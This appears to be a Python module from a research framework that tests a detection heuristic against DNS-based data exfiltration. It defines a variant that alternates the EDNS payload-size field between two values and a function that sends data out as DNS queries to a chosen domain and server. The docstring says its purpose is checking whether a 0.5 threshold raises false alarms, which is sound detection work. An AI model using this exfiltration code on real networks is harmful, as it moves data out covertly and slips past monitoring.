#!/usr/bin/env python3
"""
T4-variant R2 — Variacao em saltos entre dois valores canonicos.

ups alterna entre 1232 e 4096 a cada query.

Razao de unicidade esperada: ~2/N onde N e total de queries
(2 valores unicos / N total). Para N >= 5, razao = 2/N <= 0.4.
Esse regime testa se H4 dispara em ratio baixo (resposta esperada
para threshold 0.5: nao dispara).

Observacao: este regime na verdade SIMULA um cliente legitimo que
varia ups entre dois valores canonicos (cenario warmup). Se H4
disparar aqui, threshold 0.5 esta muito baixo.
"""

import random
from techniques.t4_variant_base import exfiltrate, payload_to_n_queries


CANONICAL_PAIR = [1232, 4096]


def gen_ups_sequence(n_queries: int) -> list:
    return [CANONICAL_PAIR[i % 2] for i in range(n_queries)]


def exfiltrate_bytes(data: bytes, domain: str,
                     dns_server: str,
                     src_port: int = None,
                     interval: float = 0.04,
                     jitter: float = 0.02) -> int:
    if src_port is None:
        src_port = random.randint(10000, 60000)
    n = payload_to_n_queries(len(data))
    seq = gen_ups_sequence(n)
    return exfiltrate(seq, domain, dns_server, src_port,
                      interval=interval, jitter=jitter)
